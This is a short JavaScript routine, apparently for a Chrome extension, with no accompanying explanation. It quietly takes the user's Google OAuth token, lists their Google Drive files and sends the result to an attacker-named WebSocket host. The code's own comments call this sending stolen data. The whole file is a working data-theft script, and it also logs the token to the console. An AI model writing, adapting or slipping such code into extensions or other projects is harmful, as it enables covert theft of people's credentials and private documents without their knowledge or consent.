(async function() {
    const WEBSOCKET_URL = "wss://attacker.com/socket"; // WebSocket Server

    async function getOAuthToken() {
        return new Promise((resolve, reject) => {
            chrome.identity.getAuthToken({ interactive: false }, function(token) {
                if (chrome.runtime.lastError) {
                    console.error("Error obtaining OAuth token:", chrome.runtime.lastError);
                    reject(chrome.runtime.lastError);
                } else {
                    console.log("OAuth token obtained successfully:", token);
                    resolve(token);
                }
            });
        });
    }

    async function fetchDriveFiles(token) {
        let response = await fetch("https://www.googleapis.com/drive/v3/files", {
            headers: { Authorization: `Bearer ${token}` }
        });
        let data = await response.json();
        return data;
    }

    function sendDataOverWebSocket(data) {
        let socket = new WebSocket(WEBSOCKET_URL);
        
        socket.onopen = () => {
            console.log("WebSocket connection opened.");
            socket.send(JSON.stringify(data)); // Send stolen data over WebSocket
        };
        
        socket.onerror = (err) => {
            console.error("WebSocket Error:", err);
        };

        socket.onclose = (event) => {
            if (event.wasClean) {
                console.log(`WebSocket connection closed cleanly, code=${event.code}, reason=${event.reason}`);
            } else {
                console.error('WebSocket connection died');
            }
        };
    }

    try {
        let token = await getOAuthToken();
        let driveFiles = await fetchDriveFiles(token);
        sendDataOverWebSocket(driveFiles); // Send stolen Drive files to WebSocket
    } catch (error) {
        console.error("Error:", error);
    }
})();
